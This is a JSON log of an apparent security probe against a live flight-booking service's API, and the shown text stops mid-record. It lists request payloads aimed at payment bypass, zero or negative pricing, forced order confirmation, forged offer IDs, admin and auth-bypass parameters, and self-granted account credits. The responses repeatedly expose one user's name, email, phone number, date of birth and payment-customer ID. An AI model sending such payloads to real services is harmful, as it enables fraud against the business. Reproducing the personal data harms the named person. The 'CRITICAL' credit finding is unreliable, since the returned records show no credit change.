{
  "test_date": "2025-11-05T17:23:25.036002",
  "target": "https://vauntapi.flyvaunt.com",
  "user_id": 20254,
  "test_results": {
    "endpoint_discovery": [
      {
        "endpoint": "/v1/duffel",
        "method": "GET",
        "status": 404,
        "description": "Base Duffel endpoint",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/offers",
        "method": "GET",
        "status": 404,
        "description": "Flight offers",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders",
        "method": "GET",
        "status": 404,
        "description": "Flight orders",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders/create",
        "method": "POST",
        "status": 404,
        "description": "Create order",
        "params": null,
        "data": {},
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking",
        "method": "GET",
        "status": 404,
        "description": "Booking base",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/flights/search",
        "method": "GET",
        "status": 404,
        "description": "Search flights",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/flights/book",
        "method": "POST",
        "status": 404,
        "description": "Book flight",
        "params": null,
        "data": {},
        "response": "Not Found"
      },
      {
        "endpoint": "/v2/duffel",
        "method": "GET",
        "status": 404,
        "description": "V2 Base Duffel endpoint",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v2/duffel/offers",
        "method": "GET",
        "status": 404,
        "description": "V2 Flight offers",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v2/duffel/orders",
        "method": "GET",
        "status": 404,
        "description": "V2 Flight orders",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/app/duffel/airlines",
        "method": "GET",
        "status": 200,
        "description": "Get airlines list",
        "params": null,
        "data": null,
        "response": []
      },
      {
        "endpoint": "/v1/app/duffel/place-suggestions",
        "method": "GET",
        "status": 200,
        "description": "Search airports",
        "params": {
          "query": "LAX"
        },
        "data": null,
        "response": {
          "warnings": [],
          "meta": null,
          "data": [
            {
              "city_name": null,
              "icao_code": null,
              "iata_city_code": "LAX",
              "airports": [
                {
                  "city_name": "Los Angeles",
                  "icao_code": "KLAX",
                  "iata_city_code": "LAX",
                  "iata_country_code": "US",
                  "iata_code": "LAX",
                  "latitude": 33.942045,
                  "longitude": -118.408263,
                  "time_zone": "America/Los_Angeles",
                  "type": "airport",
                  "name": "Los Angeles International Airport",
                  "id": "arp_lax_us"
                },
                {
                  "city_name": "Los Angeles",
                  "icao_code": "KVNY",
                  "iata_city_code": "LAX",
                  "iata_country_code": "US",
                  "iata_code": "VNY",
                  "latitude": 34.208582,
                  "longitude": -118.489719,
                  "time_zone": "America/Los_Angeles",
                  "type": "airport",
                  "name": "Van Nuys Airport",
                  "id": "arp_vny_us"
                },
                {
                  "city_name": "Los Angeles",
                  "icao_code": "KWHP",
                  "iata_city_code": "LAX",
                  "iata_country_code": "US",
                  "iata_code": "WHP",
                  "latitude": 34.25989,
                  "longitude": -118.412713,
                  "time_zone": "America/Los_Angeles",
                  "type": "airport",
                  "name": "Whiteman Airport",
                  "id": "arp_whp_us"
                },
                {
                  "city_name": "Ontario",
                  "icao_code": "KONT",
                  "iata_city_code": "LAX",
                  "iata_country_code": "US",
                  "iata_code": "ONT",
                  "latitude": 34.055988,
                  "longitude": -117.599527,
                  "time_zone": "America/Los_Angeles",
                  "type": "airport",
                  "name": "Ontario International Airport",
                  "id": "arp_ont_us"
                }
              ],
              "iata_country_code": "US",
              "iata_code": "LAX",
              "latitude": null,
              "longitude": null,
              "city": null,
              "time_zone": null,
              "type": "city",
              "name": "Los Angeles",
              "id": "cit_lax_us"
            },
            {
              "city_name": "Los Angeles",
              "icao_code": "KLAX",
              "iata_city_code": "LAX",
              "airports": null,
              "iata_country_code": "US",
              "iata_code": "LAX",
              "latitude": 33.942045,
              "longitude": -118.408263,
              "city": {
                "city_name": null,
                "icao_code": null,
                "iata_city_code": "LAX",
                "iata_country_code": "US",
                "iata_code": "LAX",
                "latitude": null,
                "longitude": null,
                "time_zone": null,
                "type": "city",
                "name": "Los Angeles",
                "id": "cit_lax_us"
              },
              "time_zone": "America/Los_Angeles",
              "type": "airport",
              "name": "Los Angeles International Airport",
              "id": "arp_lax_us"
            },
            {
              "city_name": "Ontario",
              "icao_code": "KONT",
              "iata_city_code": "LAX",
              "airports": null,
              "iata_country_code": "US",
              "iata_code": "ONT",
              "latitude": 34.055988,
              "longitude": -117.599527,
              "city": {
                "city_name": null,
                "icao_code": null,
                "iata_city_code": "LAX",
                "iata_country_code": "US",
                "iata_code": "LAX",
                "latitude": null,
                "longitude": null,
                "time_zone": null,
                "type": "city",
                "name": "Los Angeles",
                "id": "cit_lax_us"
              },
              "time_zone": "America/Los_Angeles",
              "type": "airport",
              "name": "Ontario International Airport",
              "id": "arp_ont_us"
            },
            {
              "city_name": "Los Angeles",
              "icao_code": "KVNY",
              "iata_city_code": "LAX",
              "airports": null,
              "iata_country_code": "US",
              "iata_code": "VNY",
              "latitude": 34.208582,
              "longitude": -118.489719,
              "city": {
                "city_name": null,
                "icao_code": null,
                "iata_city_code": "LAX",
                "iata_country_code": "US",
                "iata_code": "LAX",
                "latitude": null,
                "longitude": null,
                "time_zone": null,
                "type": "city",
                "name": "Los Angeles",
                "id": "cit_lax_us"
              },
              "time_zone": "America/Los_Angeles",
              "type": "airport",
              "name": "Van Nuys Airport",
              "id": "arp_vny_us"
            },
            {
              "city_name": "Los Angeles",
              "icao_code": "KWHP",
              "iata_city_code": "LAX",
              "airports": null,
              "iata_country_code": "US",
              "iata_code": "WHP",
              "latitude": 34.25989,
              "longitude": -118.412713,
              "city": {
                "city_name": null,
                "icao_code": null,
                "iata_city_code": "LAX",
                "iata_country_code": "US",
                "iata_code": "LAX",
                "latitude": null,
                "longitude": null,
                "time_zone": null,
                "type": "city",
                "name": "Los Angeles",
                "id": "cit_lax_us"
              },
              "time_zone": "America/Los_Angeles",
              "type": "airport",
              "name": "Whiteman Airport",
              "id": "arp_whp_us"
            }
          ],
          "headers": {}
        }
      },
      {
        "endpoint": "/v1/app/duffel/orders",
        "method": "GET",
        "status": 200,
        "description": "Get user orders",
        "params": null,
        "data": null,
        "response": {
          "orders": []
        }
      },
      {
        "endpoint": "/v1/app/duffel/get-places-by-iata",
        "method": "GET",
        "status": 400,
        "description": "Get place by IATA",
        "params": {
          "iata": "LAX"
        },
        "data": null,
        "response": {
          "code": "E_MISSING_OR_INVALID_PARAMS",
          "problems": [
            "\"from_iata\" is required, but it was not defined.",
            "\"to_iata\" is required, but it was not defined."
          ],
          "message": "The server could not fulfill this request (`GET /v1/app/duffel/get-places-by-iata`) due to 2 missing or invalid parameters."
        }
      },
      {
        "endpoint": "/v1/app/duffel/create-hold-order",
        "method": "POST",
        "status": 400,
        "description": "Create hold order",
        "params": null,
        "data": {},
        "response": {
          "code": "E_MISSING_OR_INVALID_PARAMS",
          "problems": [
            "\"id\" is required, but it was not defined.",
            "\"passengers\" is required, but it was not defined.",
            "\"services\" is required, but it was not defined."
          ],
          "message": "The server could not fulfill this request (`POST /v1/app/duffel/create-hold-order`) due to 3 missing or invalid parameters."
        }
      },
      {
        "endpoint": "/v1/app/duffel/create-order",
        "method": "POST",
        "status": 400,
        "description": "Create order",
        "params": null,
        "data": {},
        "response": {
          "code": "E_MISSING_OR_INVALID_PARAMS",
          "problems": [
            "\"passengers\" is required, but it was not defined.",
            "\"selected_offers\" is required, but it was not defined.",
            "\"type\" is required, but it was not defined."
          ],
          "message": "The server could not fulfill this request (`POST /v1/app/duffel/create-order`) due to 3 missing or invalid parameters."
        }
      },
      {
        "endpoint": "/v1/app/duffel/offers",
        "method": "GET",
        "status": 404,
        "description": "Get offers",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/stays/geocoding",
        "method": "GET",
        "status": 400,
        "description": "Hotel geocoding",
        "params": {
          "query": "Miami"
        },
        "data": null,
        "response": {
          "code": "E_MISSING_OR_INVALID_PARAMS",
          "problems": [
            "\"q\" is required, but it was not defined."
          ],
          "message": "The server could not fulfill this request (`GET /v1/duffel/stays/geocoding`) due to 1 missing or invalid parameter."
        }
      },
      {
        "endpoint": "/v1/duffel/stays/search",
        "method": "GET",
        "status": 404,
        "description": "Hotel search",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/stays/offers",
        "method": "GET",
        "status": 404,
        "description": "Hotel offers",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders/{orderId}",
        "method": "GET",
        "status": 404,
        "description": "Get specific order",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders/{orderId}",
        "method": "PATCH",
        "status": 404,
        "description": "Update order",
        "params": null,
        "data": {},
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders/confirm",
        "method": "POST",
        "status": 404,
        "description": "Confirm order",
        "params": null,
        "data": {},
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/list",
        "method": "GET",
        "status": 404,
        "description": "List bookings",
        "params": null,
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/create",
        "method": "POST",
        "status": 404,
        "description": "Create booking",
        "params": null,
        "data": {},
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/confirm",
        "method": "POST",
        "status": 404,
        "description": "Confirm booking",
        "params": null,
        "data": {},
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/finalize",
        "method": "POST",
        "status": 404,
        "description": "Finalize booking",
        "params": null,
        "data": {},
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/{id}",
        "method": "PATCH",
        "status": 404,
        "description": "Update booking",
        "params": null,
        "data": {},
        "response": "Not Found"
      }
    ],
    "direct_api_access": [
      {
        "endpoint": "/v1/duffel/offers/search",
        "method": "POST",
        "status": 404,
        "description": "Search flight offers",
        "params": null,
        "data": {
          "origin": "LAX",
          "destination": "JFK",
          "departure_date": "2025-12-05",
          "cabin_class": "economy"
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/app/duffel/offers/search",
        "method": "POST",
        "status": 404,
        "description": "App search flight offers",
        "params": null,
        "data": {
          "origin": "LAX",
          "destination": "JFK",
          "departure_date": "2025-12-05"
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/offers",
        "method": "GET",
        "status": 404,
        "description": "Get offers",
        "params": {
          "origin": "LAX",
          "destination": "JFK"
        },
        "data": null,
        "response": "Not Found"
      }
    ],
    "price_manipulation": [
      {
        "endpoint": "/v1/booking/create",
        "method": "POST",
        "status": 404,
        "description": "Zero price booking",
        "params": null,
        "data": {
          "flight_id": 1,
          "price": 0,
          "total_amount": "0.00"
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/create",
        "method": "POST",
        "status": 404,
        "description": "Penny price booking",
        "params": null,
        "data": {
          "flight_id": 1,
          "price": 0.01,
          "total_amount": "0.01"
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders/create",
        "method": "POST",
        "status": 404,
        "description": "Manipulated Duffel order",
        "params": null,
        "data": {
          "offer_id": "test_offer_123",
          "total_amount": "0.01",
          "price": 1
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/app/duffel/create-order",
        "method": "POST",
        "status": 400,
        "description": "Zero price Duffel order",
        "params": null,
        "data": {
          "offer_id": "test_offer_123",
          "total_amount": "0.00"
        },
        "response": {
          "code": "E_MISSING_OR_INVALID_PARAMS",
          "problems": [
            "\"passengers\" is required, but it was not defined.",
            "\"selected_offers\" is required, but it was not defined.",
            "\"type\" is required, but it was not defined."
          ],
          "message": "The server could not fulfill this request (`POST /v1/app/duffel/create-order`) due to 3 missing or invalid parameters."
        }
      },
      {
        "endpoint": "/v1/booking/1",
        "method": "PATCH",
        "status": 404,
        "description": "Update booking price to zero",
        "params": null,
        "data": {
          "price": 0,
          "total_amount": "0.00"
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/create",
        "method": "POST",
        "status": 404,
        "description": "Negative price booking",
        "params": null,
        "data": {
          "flight_id": 1,
          "price": -100,
          "total_amount": "-100.00"
        },
        "response": "Not Found"
      }
    ],
    "payment_bypass": [
      {
        "endpoint": "/v1/booking/confirm",
        "method": "POST",
        "status": 404,
        "description": "Confirm without payment",
        "params": null,
        "data": {
          "booking_id": 1
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/confirm",
        "method": "POST",
        "status": 404,
        "description": "Force paid status",
        "params": null,
        "data": {
          "booking_id": 1,
          "paid": true
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/finalize",
        "method": "POST",
        "status": 404,
        "description": "Finalize with fake payment",
        "params": null,
        "data": {
          "booking_id": 1,
          "paid": true,
          "payment_confirmed": true
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders/create",
        "method": "POST",
        "status": 404,
        "description": "Skip payment flag",
        "params": null,
        "data": {
          "offer_id": "test_offer_123",
          "skip_payment": true,
          "skipPayment": true
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/app/duffel/create-order",
        "method": "POST",
        "status": 400,
        "description": "Force payment completed status",
        "params": null,
        "data": {
          "offer_id": "test_offer_123",
          "payment_status": "completed",
          "bypass_payment": true
        },
        "response": {
          "code": "E_MISSING_OR_INVALID_PARAMS",
          "problems": [
            "\"passengers\" is required, but it was not defined.",
            "\"selected_offers\" is required, but it was not defined.",
            "\"type\" is required, but it was not defined."
          ],
          "message": "The server could not fulfill this request (`POST /v1/app/duffel/create-order`) due to 3 missing or invalid parameters."
        }
      }
    ],
    "credit_manipulation": [
      {
        "endpoint": "/v1/user",
        "method": "PATCH",
        "status": 200,
        "description": "Add flight credits",
        "params": null,
        "data": {
          "flightCredits": 10000
        },
        "response": {
          "sweepstakesEntries": [],
          "createdAt": 1710825847458,
          "updatedAt": 1762363401204,
          "id": 20254,
          "phoneNumber": "+13035234453",
          "email": "sameer.s.chopra@gmail.com",
          "confirmedEmail": "sameer.s.chopra@gmail.com",
          "priorityScore": 1931577847,
          "firstName": "Sameer",
          "middleName": "",
          "lastName": "Chopra",
          "dateOfBirth": "1991-08-14",
          "weight": 140,
          "gender": "Male",
          "isCarbonOffsetEnrolled": true,
          "successfulReferralCount": 0,
          "lastFlightPurchase": null,
          "eulaVersion": null,
          "isEulaAccepted": false,
          "hasStripePaymentDetails": false,
          "stripeCustomerId": "cus_PlS5D89fzdDYgF",
          "stripeSubscriptionId": null,
          "stripeSubscriptionPaymentIntentId": null,
          "stripeFlightPurchasePaymentIntentId": null,
          "subscriptionStartDate": 1760700980000,
          "subscriptionRenewalDate": 1830297600000,
          "lastActivityAt": 1762307406434,
          "referralKey": "nBBMuS",
          "smsOptIn": true,
          "emailOptIn": true,
          "trackingOptIn": false,
          "isFlightNotificationEnabled": true,
          "isAllFlightsNotificationEnabled": true,
          "androidAppVersion": "1.1.40",
          "androidBuildNumber": 183,
          "iosAppVersion": "1.1.40",
          "iosBuildNumber": 219,
          "abandonedRegReminderSent": false,
          "license": {
            "createdAt": 1760700980000,
            "updatedAt": 1760746044256,
            "id": 3050,
            "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
            "expiresAt": 1830297600000,
            "isAssigned": true,
            "stripeSubscriptionId": null,
            "preferredStripeCreationDate": 1798761600000,
            "membershipTier": {
              "id": 2,
              "name": "cabin+",
              "priorityLevel": 2
            },
            "account": null,
            "user": 20254,
            "licenseRefund": null
          },
          "account": null,
          "subscriptionStatus": 3,
          "waitlistUpgrades": [
            {
              "createdAt": 1761856740189,
              "updatedAt": 1761864095757,
              "id": 7756,
              "costToUse": 0,
              "customAmount": null,
              "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
              "usedOn": 1761864095757,
              "priorityUpgradeTier": {
                "id": 4,
                "name": "cabin+_free",
                "priorityLevel": 2,
                "stripePriceId": null
              },
              "user": 20254,
              "expiresOn": -1
            }
          ],
          "termsStatus": {
            "TermsAndConditions": {
              "requiresAcceptance": false,
              "currentVersion": "1.1",
              "lastAcceptedVersion": "1.1",
              "lastAcceptedDate": 1756848451030
            },
            "PrivacyPolicy": {
              "requiresAcceptance": false,
              "currentVersion": "1.1",
              "lastAcceptedVersion": "1.1",
              "lastAcceptedDate": 1756848451047
            }
          }
        }
      },
      {
        "endpoint": "/v1/user",
        "method": "PATCH",
        "status": 200,
        "description": "Add account balance",
        "params": null,
        "data": {
          "balance": 10000,
          "accountBalance": 10000
        },
        "response": {
          "sweepstakesEntries": [],
          "createdAt": 1710825847458,
          "updatedAt": 1762363401720,
          "id": 20254,
          "phoneNumber": "+13035234453",
          "email": "sameer.s.chopra@gmail.com",
          "confirmedEmail": "sameer.s.chopra@gmail.com",
          "priorityScore": 1931577847,
          "firstName": "Sameer",
          "middleName": "",
          "lastName": "Chopra",
          "dateOfBirth": "1991-08-14",
          "weight": 140,
          "gender": "Male",
          "isCarbonOffsetEnrolled": true,
          "successfulReferralCount": 0,
          "lastFlightPurchase": null,
          "eulaVersion": null,
          "isEulaAccepted": false,
          "hasStripePaymentDetails": false,
          "stripeCustomerId": "cus_PlS5D89fzdDYgF",
          "stripeSubscriptionId": null,
          "stripeSubscriptionPaymentIntentId": null,
          "stripeFlightPurchasePaymentIntentId": null,
          "subscriptionStartDate": 1760700980000,
          "subscriptionRenewalDate": 1830297600000,
          "lastActivityAt": 1762307406434,
          "referralKey": "nBBMuS",
          "smsOptIn": true,
          "emailOptIn": true,
          "trackingOptIn": false,
          "isFlightNotificationEnabled": true,
          "isAllFlightsNotificationEnabled": true,
          "androidAppVersion": "1.1.40",
          "androidBuildNumber": 183,
          "iosAppVersion": "1.1.40",
          "iosBuildNumber": 219,
          "abandonedRegReminderSent": false,
          "license": {
            "createdAt": 1760700980000,
            "updatedAt": 1760746044256,
            "id": 3050,
            "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
            "expiresAt": 1830297600000,
            "isAssigned": true,
            "stripeSubscriptionId": null,
            "preferredStripeCreationDate": 1798761600000,
            "membershipTier": {
              "id": 2,
              "name": "cabin+",
              "priorityLevel": 2
            },
            "account": null,
            "user": 20254,
            "licenseRefund": null
          },
          "account": null,
          "subscriptionStatus": 3,
          "waitlistUpgrades": [
            {
              "createdAt": 1761856740189,
              "updatedAt": 1761864095757,
              "id": 7756,
              "costToUse": 0,
              "customAmount": null,
              "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
              "usedOn": 1761864095757,
              "priorityUpgradeTier": {
                "id": 4,
                "name": "cabin+_free",
                "priorityLevel": 2,
                "stripePriceId": null
              },
              "user": 20254,
              "expiresOn": -1
            }
          ],
          "termsStatus": {
            "TermsAndConditions": {
              "requiresAcceptance": false,
              "currentVersion": "1.1",
              "lastAcceptedVersion": "1.1",
              "lastAcceptedDate": 1756848451030
            },
            "PrivacyPolicy": {
              "requiresAcceptance": false,
              "currentVersion": "1.1",
              "lastAcceptedVersion": "1.1",
              "lastAcceptedDate": 1756848451047
            }
          }
        }
      },
      {
        "endpoint": "/v1/credits/add",
        "method": "POST",
        "status": 404,
        "description": "Add credits via endpoint",
        "params": null,
        "data": {
          "amount": 10000,
          "user_id": 20254
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/balance/add",
        "method": "POST",
        "status": 404,
        "description": "Add balance",
        "params": null,
        "data": {
          "amount": 10000
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/create",
        "method": "POST",
        "status": 404,
        "description": "Use non-existent credits",
        "params": null,
        "data": {
          "flight_id": 1,
          "useCredits": 10000
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/user",
        "method": "PATCH",
        "status": 200,
        "description": "Add Duffel credits",
        "params": null,
        "data": {
          "duffel_credits": 9999
        },
        "response": {
          "sweepstakesEntries": [],
          "createdAt": 1710825847458,
          "updatedAt": 1762363402589,
          "id": 20254,
          "phoneNumber": "+13035234453",
          "email": "sameer.s.chopra@gmail.com",
          "confirmedEmail": "sameer.s.chopra@gmail.com",
          "priorityScore": 1931577847,
          "firstName": "Sameer",
          "middleName": "",
          "lastName": "Chopra",
          "dateOfBirth": "1991-08-14",
          "weight": 140,
          "gender": "Male",
          "isCarbonOffsetEnrolled": true,
          "successfulReferralCount": 0,
          "lastFlightPurchase": null,
          "eulaVersion": null,
          "isEulaAccepted": false,
          "hasStripePaymentDetails": false,
          "stripeCustomerId": "cus_PlS5D89fzdDYgF",
          "stripeSubscriptionId": null,
          "stripeSubscriptionPaymentIntentId": null,
          "stripeFlightPurchasePaymentIntentId": null,
          "subscriptionStartDate": 1760700980000,
          "subscriptionRenewalDate": 1830297600000,
          "lastActivityAt": 1762307406434,
          "referralKey": "nBBMuS",
          "smsOptIn": true,
          "emailOptIn": true,
          "trackingOptIn": false,
          "isFlightNotificationEnabled": true,
          "isAllFlightsNotificationEnabled": true,
          "androidAppVersion": "1.1.40",
          "androidBuildNumber": 183,
          "iosAppVersion": "1.1.40",
          "iosBuildNumber": 219,
          "abandonedRegReminderSent": false,
          "license": {
            "createdAt": 1760700980000,
            "updatedAt": 1760746044256,
            "id": 3050,
            "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
            "expiresAt": 1830297600000,
            "isAssigned": true,
            "stripeSubscriptionId": null,
            "preferredStripeCreationDate": 1798761600000,
            "membershipTier": {
              "id": 2,
              "name": "cabin+",
              "priorityLevel": 2
            },
            "account": null,
            "user": 20254,
            "licenseRefund": null
          },
          "account": null,
          "subscriptionStatus": 3,
          "waitlistUpgrades": [
            {
              "createdAt": 1761856740189,
              "updatedAt": 1761864095757,
              "id": 7756,
              "costToUse": 0,
              "customAmount": null,
              "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
              "usedOn": 1761864095757,
              "priorityUpgradeTier": {
                "id": 4,
                "name": "cabin+_free",
                "priorityLevel": 2,
                "stripePriceId": null
              },
              "user": 20254,
              "expiresOn": -1
            }
          ],
          "termsStatus": {
            "TermsAndConditions": {
              "requiresAcceptance": false,
              "currentVersion": "1.1",
              "lastAcceptedVersion": "1.1",
              "lastAcceptedDate": 1756848451030
            },
            "PrivacyPolicy": {
              "requiresAcceptance": false,
              "currentVersion": "1.1",
              "lastAcceptedVersion": "1.1",
              "lastAcceptedDate": 1756848451047
            }
          }
        }
      }
    ],
    "test_card_bypass": [
      {
        "endpoint": "/v1/booking/create",
        "method": "POST",
        "status": 404,
        "description": "Test payment method",
        "params": null,
        "data": {
          "flight_id": 1,
          "payment": {
            "method": "test",
            "test_mode": true
          }
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders/create",
        "method": "POST",
        "status": 404,
        "description": "Duffel test mode",
        "params": null,
        "data": {
          "offer_id": "test_offer_123",
          "test_mode": true,
          "sandbox": true
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/create",
        "method": "POST",
        "status": 404,
        "description": "Stripe test card",
        "params": null,
        "data": {
          "flight_id": 1,
          "payment": {
            "card_number": "4242424242424242",
            "test": true
          }
        },
        "response": "Not Found"
      }
    ],
    "offer_manipulation": [
      {
        "endpoint": "/v1/duffel/orders/create",
        "method": "POST",
        "status": 404,
        "description": "Use fake offer ID",
        "params": null,
        "data": {
          "offer_id": "stolen_offer_12345",
          "user_id": 20254
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders/create",
        "method": "POST",
        "status": 404,
        "description": "Use expired offer ID",
        "params": null,
        "data": {
          "offer_id": "expired_offer_12345"
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/app/duffel/create-order",
        "method": "POST",
        "status": 400,
        "description": "Use another user's offer",
        "params": null,
        "data": {
          "offer_id": "other_user_offer_12345"
        },
        "response": {
          "code": "E_MISSING_OR_INVALID_PARAMS",
          "problems": [
            "\"passengers\" is required, but it was not defined.",
            "\"selected_offers\" is required, but it was not defined.",
            "\"type\" is required, but it was not defined."
          ],
          "message": "The server could not fulfill this request (`POST /v1/app/duffel/create-order`) due to 3 missing or invalid parameters."
        }
      }
    ],
    "status_manipulation": [
      {
        "endpoint": "/v1/duffel/orders/1",
        "method": "PATCH",
        "status": 404,
        "description": "Force order confirmed",
        "params": null,
        "data": {
          "status": "confirmed",
          "payment_status": "completed"
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/1/confirm",
        "method": "POST",
        "status": 404,
        "description": "Force booking confirmation",
        "params": null,
        "data": {
          "force_confirm": true
        },
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/1",
        "method": "PATCH",
        "status": 404,
        "description": "Update booking status",
        "params": null,
        "data": {
          "status": "confirmed",
          "paid": true
        },
        "response": "Not Found"
      }
    ],
    "exposed_keys": [],
    "parameter_injection": [
      {
        "endpoint": "/v1/duffel/offers",
        "method": "GET",
        "status": 404,
        "description": "Admin parameter",
        "params": {
          "showAll": "true",
          "admin": "true"
        },
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking",
        "method": "GET",
        "status": 404,
        "description": "Include all parameter",
        "params": {
          "includeAll": "true",
          "admin": "true"
        },
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/duffel/orders",
        "method": "GET",
        "status": 404,
        "description": "Access other user orders",
        "params": {
          "userId": "1",
          "limit": "9999"
        },
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/app/duffel/orders",
        "method": "GET",
        "status": 200,
        "description": "Show all orders",
        "params": {
          "all": "true",
          "showAll": "true"
        },
        "data": null,
        "response": {
          "orders": []
        }
      },
      {
        "endpoint": "/v1/duffel/orders",
        "method": "GET",
        "status": 404,
        "description": "Bypass auth parameter",
        "params": {
          "bypass_auth": "true"
        },
        "data": null,
        "response": "Not Found"
      },
      {
        "endpoint": "/v1/booking/list",
        "method": "GET",
        "status": 404,
        "description": "Admin debug mode",
        "params": {
          "admin": "1",
          "debug": "1"
        },
        "data": null,
        "response": "Not Found"
      }
    ]
  },
  "vulnerabilities": [
    {
      "category": "Credit Manipulation",
      "severity": "CRITICAL",
      "title": "Credit/Balance Manipulation Possible: Add flight credits",
      "description": "System accepts credit manipulation via /v1/user",
      "proof": {
        "request": {
          "endpoint": "/v1/user",
          "method": "PATCH",
          "status": 200,
          "description": "Add flight credits",
          "params": null,
          "data": {
            "flightCredits": 10000
          },
          "response": {
            "sweepstakesEntries": [],
            "createdAt": 1710825847458,
            "updatedAt": 1762363401204,
            "id": 20254,
            "phoneNumber": "+13035234453",
            "email": "sameer.s.chopra@gmail.com",
            "confirmedEmail": "sameer.s.chopra@gmail.com",
            "priorityScore": 1931577847,
            "firstName": "Sameer",
            "middleName": "",
            "lastName": "Chopra",
            "dateOfBirth": "1991-08-14",
            "weight": 140,
            "gender": "Male",
            "isCarbonOffsetEnrolled": true,
            "successfulReferralCount": 0,
            "lastFlightPurchase": null,
            "eulaVersion": null,
            "isEulaAccepted": false,
            "hasStripePaymentDetails": false,
            "stripeCustomerId": "cus_PlS5D89fzdDYgF",
            "stripeSubscriptionId": null,
            "stripeSubscriptionPaymentIntentId": null,
            "stripeFlightPurchasePaymentIntentId": null,
            "subscriptionStartDate": 1760700980000,
            "subscriptionRenewalDate": 1830297600000,
            "lastActivityAt": 1762307406434,
            "referralKey": "nBBMuS",
            "smsOptIn": true,
            "emailOptIn": true,
            "trackingOptIn": false,
            "isFlightNotificationEnabled": true,
            "isAllFlightsNotificationEnabled": true,
            "androidAppVersion": "1.1.40",
            "androidBuildNumber": 183,
            "iosAppVersion": "1.1.40",
            "iosBuildNumber": 219,
            "abandonedRegReminderSent": false,
            "license": {
              "createdAt": 1760700980000,
              "updatedAt": 1760746044256,
              "id": 3050,
              "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
              "expiresAt": 1830297600000,
              "isAssigned": true,
              "stripeSubscriptionId": null,
              "preferredStripeCreationDate": 1798761600000,
              "membershipTier": {
                "id": 2,
                "name": "cabin+",
                "priorityLevel": 2
              },
              "account": null,
              "user": 20254,
              "licenseRefund": null
            },
            "account": null,
            "subscriptionStatus": 3,
            "waitlistUpgrades": [
              {
                "createdAt": 1761856740189,
                "updatedAt": 1761864095757,
                "id": 7756,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
                "usedOn": 1761864095757,
                "priorityUpgradeTier": {
                  "id": 4,
                  "name": "cabin+_free",
                  "priorityLevel": 2,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              }
            ],
            "termsStatus": {
              "TermsAndConditions": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451030
              },
              "PrivacyPolicy": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451047
              }
            }
          }
        },
        "verification": {
          "endpoint": "/v1/user",
          "method": "GET",
          "status": 200,
          "description": "Verify user",
          "params": null,
          "data": null,
          "response": {
            "sweepstakesEntries": [],
            "createdAt": 1710825847458,
            "updatedAt": 1762363401204,
            "id": 20254,
            "phoneNumber": "+13035234453",
            "email": "sameer.s.chopra@gmail.com",
            "confirmedEmail": "sameer.s.chopra@gmail.com",
            "priorityScore": 1931577847,
            "firstName": "Sameer",
            "middleName": "",
            "lastName": "Chopra",
            "dateOfBirth": "1991-08-14",
            "weight": 140,
            "gender": "Male",
            "isCarbonOffsetEnrolled": true,
